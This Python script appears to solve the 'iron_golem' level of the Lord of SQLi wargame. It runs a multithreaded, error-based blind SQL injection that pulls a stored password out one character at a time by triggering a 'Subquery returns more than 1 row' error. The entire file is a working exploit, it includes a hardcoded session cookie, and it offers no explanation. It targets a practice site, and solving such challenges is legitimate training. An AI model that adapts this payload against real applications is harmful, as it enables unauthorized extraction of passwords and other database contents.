#!/usr/bin/env python
# -*- coding: utf8 -*-
import requests
import threading

key = {}

def run(i):
	url = "https://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php"
	headers = {'Host': 'los.eagle-jump.org', 'Cookie': 'PHPSESSID=etgnhpi5bevt9oc4bsdtdkfg63;'}
	for n in range(255,0,-1):
		payload = "?pw='||if(ord(substr(pw,{},1))={},(select 1 union select 2),1)%23".format(i,n)
		r = requests.get(url + payload, headers=headers)
		if( r.text.find("Subquery returns more than 1 row") != -1 and n != 0):
			key[i] = n
			print("No.{} Found Key: {}".format(i ,n))
			break

def main():
	threads = []
	threadNum = 20
	for count in range(threadNum):
		key[count] = 0
		threads.append(threading.Thread(target = run, args = (count,)))
		threads[count].start()		

	for count in range(threadNum):
		threads[count].join()

	print("Key:")
	for count in range(threadNum):
		if key[count] != 0:
			print(key[count], end=' ')
	print("")
	for count in range(threadNum):
		if key[count] != 0:
			print(chr(key[count]), end='')

if __name__ == '__main__':
	main()